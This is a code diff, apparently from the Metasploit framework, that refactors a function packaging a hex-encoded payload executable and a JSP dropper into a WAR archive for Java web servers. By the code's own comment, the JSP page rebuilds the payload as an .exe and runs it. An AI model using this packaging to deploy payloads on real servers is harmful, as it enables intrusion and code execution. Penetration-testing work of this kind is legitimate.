@@ -711,33 +711,17 @@ require 'metasm'
 		to_exe_asp(to_win32pe(framework, code, opts), opts)
 	end
 
-	# Creates a Web Archive (WAR) file containing a jsp page and hexdump of a payload.
-	# The jsp page converts the hexdump back to a normal .exe file and places it in
-	# the temp directory. The payload .exe file is then executed.
-	def self.to_jsp_war(framework, arch, plat, code='', opts={})
-
-		exe = to_executable(framework, arch, plat, code, opts)
+	# Creates a Web Archive (WAR) file from the provided jsp code. Additional options
+	# can be provided via  the "opts" hash.
+	def self.to_war(jsp_raw, opts={})
 		jsp_name = opts[:jsp_name]
 		jsp_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
+		app_name = opts[:app_name]
+		app_name ||= Rex::Text.rand_text_alpha_lower(rand(8)+8)
 
-		zip = Rex::Zip::Archive.new
-
-		# begin meta-inf/
-		minf = [ 0xcafe, 0x0003 ].pack('Vv')
-		zip.add_file('META-INF/', nil, minf)
-		# end meta-inf/
-
-		# begin meta-inf/manifest.mf
-		mfraw = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
-		zip.add_file('META-INF/MANIFEST.MF', mfraw)
-		# end meta-inf/manifest.mf
-
-		# begin web-inf/
-		zip.add_file('WEB-INF/', '')
-		# end web-inf/
-
-		# begin web-inf/web.xml
-		webxmlraw = %q{<?xml version="1.0"?>
+		meta_inf = [ 0xcafe, 0x0003 ].pack('Vv')
+		manifest = "Manifest-Version: 1.0\r\nCreated-By: 1.6.0_17 (Sun Microsystems Inc.)\r\n\r\n"
+		web_xml = %q{<?xml version="1.0"?>
 <!DOCTYPE web-app PUBLIC
  "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
  "http://java.sun.com/dtds/web-app_2_3.dtd">
@@ -748,12 +732,33 @@ require 'metasm'
  </servlet>
 </web-app>
 }
-		var_name = Rex::Text.rand_text_alpha_lower(rand(8)+8)
-		webxmlraw.gsub!(/NAME/, var_name)
-		webxmlraw.gsub!(/PAYLOAD/, jsp_name)
+		web_xml.gsub!(/NAME/, app_name)
+		web_xml.gsub!(/PAYLOAD/, jsp_name)
 
-		zip.add_file('WEB-INF/web.xml', webxmlraw)
-		# end web-inf/web.xml
+		zip = Rex::Zip::Archive.new
+		zip.add_file('META-INF/', nil, meta_inf)
+		zip.add_file('META-INF/MANIFEST.MF', manifest)
+		zip.add_file('WEB-INF/', '')
+		zip.add_file('WEB-INF/web.xml', web_xml)
+		# add the payload
+		zip.add_file("#{jsp_name}.jsp", jsp_raw)
+
+		# add extra files
+		if opts[:extra_files]
+			opts[:extra_files].each { |el|
+				zip.add_file(el[0], el[1])
+			}
+		end
+
+		return zip.pack
+	end
+
+	# Creates a Web Archive (WAR) file containing a jsp page and hexdump of a payload.
+	# The jsp page converts the hexdump back to a normal .exe file and places it in
+	# the temp directory. The payload .exe file is then executed.
+	def self.to_jsp_war(framework, arch, plat, code='', opts={})
+
+		exe = to_executable(framework, arch, plat, code, opts)
 
 		# begin <payload>.jsp
 		var_hexpath       = Rex::Text.rand_text_alpha(rand(8)+8)
@@ -822,15 +827,17 @@ require 'metasm'
 
 		jspraw << "%>\n"
 
-		zip.add_file("#{jsp_name}.jsp", jspraw)
-		# end <payload>.jsp
+		# Specify the payload in hex as an extra file..
+		payload_hex = exe.unpack('H*')[0]
+		opts.merge!(
+			{
+				:extra_files =>
+					[
+						[ "#{var_hexfile}.txt", payload_hex ]
+					]
+			})
 
-		# begin <payload>.txt
-		payloadraw = exe.unpack('H*')[0]
-		zip.add_file("#{var_hexfile}.txt", payloadraw)
-		# end <payload>.txt
-
-		return zip.pack
+		return self.to_war(jspraw, opts)
 	end
 
 
